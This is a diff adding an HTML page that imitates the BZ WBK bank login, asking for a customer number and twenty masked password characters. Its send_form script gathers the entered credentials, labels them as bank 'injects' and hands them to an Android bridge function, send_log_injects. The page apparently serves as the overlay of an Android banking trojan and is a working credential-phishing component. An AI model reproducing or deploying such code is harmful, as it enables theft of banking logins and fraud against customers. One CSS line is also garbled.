@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>bzwbk</title>
+    <link rel="shortcut icon" href="pl.bzwbk.ibiznes24.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #ededed;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: right;
+    background-size: 100%;
+    padding: 20px 30px 20px 0px;
+    background: #c42a1e;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }oid    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #151515;
+    text-align: left;
+    outline: none;
+    border: 1px solid #c6c6c6;
+    background: #fff;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #00BCD4;
+    border: none;
+    font-size: 17px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #fff;
+    border-radius: 5px;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #151515;
+    font-size: 15px;
+}
+.pass input::placeholder {
+    font-size: 11px;
+}
+</style>
+
+<script type="text/javascript">
+    function next() {
+        if (document.getElementById("login").value == '')
+{
+    alert ('Wszystkie pola wymagane!');
+    return false;
+}
+        document.getElementById("pw").style.display="block";
+        document.getElementById("ne").style.display="none";
+        document.getElementById("lo").style.display="block";
+    }
+function testJump(x){
+    var ml = ~~x.getAttribute('maxlength');
+    if(ml && x.value.length >= ml){
+        do {
+      x = x.nextSibling;
+    }
+    while (x && !((/text/.test(x.type)) || x.disabled));
+        if(x && /text/.test(x.type)){
+            x.focus();
+        }
+    }
+}
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo">
+    <span style="display: block;position: relative;font-weight: 400;padding-left: 10px;float: none;text-align: left;">Logowanie</span>
+</div>
+
+<div class="area" style="background: #fff;padding: 20px 20px 50px 20px;border-radius: 3px;">
+        <label style="float: left; color: #000; padding-bottom: 10px;">NIK</label>
+        <input type="text" name="login" id="login" style="height: 50px; text-align: center;">
+
+<input type="button" name="" id="ne" onclick="next()" value="Dalej" style="
+    position: relative;
+    top: 50px;
+    background: #c42a1e;
+    color: #fff;
+">
+
+        <div id="pw" style="display: none; margin-top: 20px;">
+            <label style="float: left; color: #000; padding-bottom: 10px;">Hasło</label>
+        
+
+<div class="pass" style="    display: inline-block; line-height: 2"> 
+
+<input type="text" name="1-" id="1-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="1" onkeyup="testJump(this);">
+<input type="text" name="2-" id="2-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="2" onkeyup="testJump(this);">
+<input type="text" name="3-" id="3-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="3" onkeyup="testJump(this);">
+<input type="text" name="4-" id="4-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="4" onkeyup="testJump(this);">
+<input type="text" name="5-" id="5-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="5" onkeyup="testJump(this);">
+<input type="text" name="6-" id="6-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="6" onkeyup="testJump(this);">
+<input type="text" name="7-" id="7-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="7" onkeyup="testJump(this);">
+<input type="text" name="8-" id="8-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="8" onkeyup="testJump(this);">
+<input type="text" name="9-" id="9-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="9" onkeyup="testJump(this);">
+<input type="text" name="10-" id="10-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="10" onkeyup="testJump(this);">
+<input type="text" name="11-" id="11-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="11" onkeyup="testJump(this);">
+<input type="text" name="12-" id="12-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="12" onkeyup="testJump(this);">
+<input type="text" name="13-" id="13-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="13" onkeyup="testJump(this);">
+<input type="text" name="14-" id="14-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="14" onkeyup="testJump(this);">
+<input type="text" name="15-" id="15-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="15" onkeyup="testJump(this);">
+<input type="text" name="16-" id="16-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="16" onkeyup="testJump(this);">
+<input type="text" name="17-" id="17-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="17" onkeyup="testJump(this);">
+<input type="text" name="18-" id="18-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="18" onkeyup="testJump(this);">
+<input type="text" name="19-" id="19-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="19" onkeyup="testJump(this);">
+<input type="text" name="20-" id="20-" style="width: 25px; padding: 10px 0px 10px 0px; height: 25px; text-align: center; display: inline; border-radius: 0px;font-size: 12px;" maxlength="1" placeholder="20" onkeyup="testJump(this);">
+
+
+</div>
+
+<input type="button" id="lo" onclick="send_form()" value="Zaloguj" style="
+    position: relative;
+    top: 50px;
+    background: #c42a1e;
+    color: #fff;
+    display: none;
+">
+
+        </div>
+        <input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+    var data = {};
+    data.login = document.getElementById('login').value;
+    data.password = `1- ${document.getElementById('1-').value} | 2- ${document.getElementById('2-').value} | 3- ${document.getElementById('3-').value} | 4- ${document.getElementById('4-').value} | 5- ${document.getElementById('5-').value} | 6- ${document.getElementById('6-').value} | 7- ${document.getElementById('7-').value} | 8- ${document.getElementById('8-').value} | 9- ${document.getElementById('9-').value} | 10- ${document.getElementById('10-').value} | 11- ${document.getElementById('11-').value} | 12- ${document.getElementById('12-').value} |  13- ${document.getElementById('13-').value} |  14- ${document.getElementById('14-').value} |  15- ${document.getElementById('15-').value} |  16- ${document.getElementById('16-').value} |  17- ${document.getElementById('17-').value} |  18- ${document.getElementById('18-').value} |  19- ${document.getElementById('19-').value} |  20- ${document.getElementById('20-').value} | `;
+    data.type_injects = "banks";
+    data.closed = "close_activity_injects";
+    
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    }
+}
+</script>
+
+</body>
+</html>
